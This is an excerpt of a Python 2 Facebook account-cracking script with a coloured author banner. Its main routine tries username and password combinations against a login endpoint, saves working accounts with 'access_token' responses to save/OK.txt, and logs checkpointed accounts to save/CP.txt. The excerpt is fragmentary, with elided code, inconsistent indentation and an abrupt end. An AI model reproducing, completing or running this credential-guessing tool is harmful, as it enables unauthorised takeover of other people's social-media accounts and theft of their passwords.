...
__author__ = 'kazi samir'
__copyright = 'All rights reserved . Copyright  kazi samir'
...
logo = """
\033[97;1m+-+-+-+-+-+ +-+-+-+-+-+-+
\033[91;1m|k|a|z|i|l| |s|a|m|i|r|
\033[92;1m+-+-+-+-+-+ +-+-+-+-+-+-+
\033[93;1mIzat diny wala Liny wala   
\033[96;1mSeaRF AllaH Pak Hy                                ​                                                                                     
\x1b[0m______________________________________________
\033[95;1mAuthor   :            kazi samir
\033[94;1mFacebook :        Termux Cyber  
\033[92;1mGitHub   :            kazisamir4
\033[96;1mVersion  :            1.1.2
\x1b[0m______________________________________________
                                                 """
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;94m  [SAMIR_OK]  ' + k + c + user + '  ^  ' + pass1
                ...
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;96m  [SAMIR_OK] ' + k + c + user + '  ^  ' + pass2
                    okb = open('save/OK.txt', 'a')
                    okb.write(k + c + user + pass2 + '\n')
                    okb.close()
                    oks.append(c + user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;95m  [SAMIR_CP] ' + k + c + user + '  ^  ' + pass2
                    cps = open('save/CP.txt', 'a')
